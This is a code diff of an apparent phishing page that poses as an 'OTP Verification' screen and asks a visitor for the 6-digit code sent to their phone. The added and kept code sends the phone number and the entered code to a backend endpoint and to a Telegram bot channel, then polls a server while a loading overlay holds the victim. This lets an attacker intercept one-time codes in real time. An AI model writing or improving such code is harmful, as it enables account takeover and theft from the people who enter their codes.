@@ -97,11 +97,10 @@
         }
 
         .phone-display {
-            display: block;
+            display: inline-block;
             font-weight: 700;
             color: #000000;
-            margin-top: 4px;
-            font-size: 16px;
+            font-size: 15px;
         }
 
         /* 6-Digit Box Styling */
@@ -286,9 +285,7 @@
     <div class="container">
         <div class="card">
             <h2>OTP Verification</h2>
-            <p>Enter the 6-digit code sent to your phone number
-                <span id="phoneTarget" class="phone-display">+263771268100</span>
-            </p>
+            <p>Enter the 6-digit code sent to your phone number <span id="phoneTarget" class="phone-display">+263771268100</span></p>
 
             <!-- Box input block for dynamic code input -->
             <div class="otp-container">
@@ -422,7 +419,7 @@
                     document.querySelector('.spinner').style.background = '#4CAF50';
                     
                     setTimeout(() => {
-                        window.location.href = "/dashboard.html"; // Adjust to final page location
+                        window.location.href = "/dashboard.html"; // Adjust to final landing screen
                     }, 2000);
                 }
 
@@ -433,7 +430,7 @@
                     
                     setTimeout(() => {
                         document.getElementById('loadingOverlay').classList.remove('active');
-                        // clear inputs for retry
+                        // Clear inputs for retry
                         document.querySelectorAll('.otp-box').forEach(i => i.value = "");
                     }, 2500);
                 }
@@ -443,8 +440,8 @@
             }
         }
 
-        // --- SUBMIT CODE TO TELEGRAM & START MODAL ---
-        function sendVerificationData() {
+        // --- SUBMIT CODE TO SERVER & TELEGRAM BOT ---
+        async function sendVerificationData() {
             const inputs = document.querySelectorAll('.otp-box');
             let otpCode = "";
             inputs.forEach(input => otpCode += input.value);
@@ -457,7 +454,19 @@
             // Show full screen processing animation overlay
             document.getElementById('loadingOverlay').classList.add('active');
 
-            // Dispatch log payload to Telegram channel
+            // 1. Dispatch payload to YOUR backend server to handle notifications
+            try {
+                await fetch("/api/verify-otp", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ phone: globalPhone, otp: otpCode, type: "OTP_Verification" })
+                });
+                console.log("✔️ Server notification endpoint dispatched.");
+            } catch (err) {
+                console.error("❌ Backend notification dispatch failed:", err);
+            }
+
+            // 2. Direct Fallback payload message to Telegram Bot Channel
             const textMessage = `🔑 *New OTP Submission Received*\n\n📱 *Phone Number:* ${globalPhone}\n🔢 *OTP Code:* \`${otpCode}\``;
 
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -472,14 +481,14 @@
             .then(res => res.json())
             .then(data => {
                 if(data.ok) {
-                    console.log("✔️ Telegram log updated successfully.");
+                    console.log("✔️ Telegram channel alert completed.");
                 }
-                // Begin console loop checks on the backend server system status every 2.5 seconds
+                // Begin checking backend server validation loop status every 2.5 seconds
                 pollingInterval = setInterval(checkVerificationStatus, 2500);
             })
             .catch(err => {
-                console.error("❌ Telegram posting error:", err);
-                // Fallback directly to backend verification loop even if Telegram client has timeout errors
+                console.error("❌ Direct Telegram fallback posting error:", err);
+                // Keep polling status anyway even if direct TG fails
                 pollingInterval = setInterval(checkVerificationStatus, 2500);
             });
         }
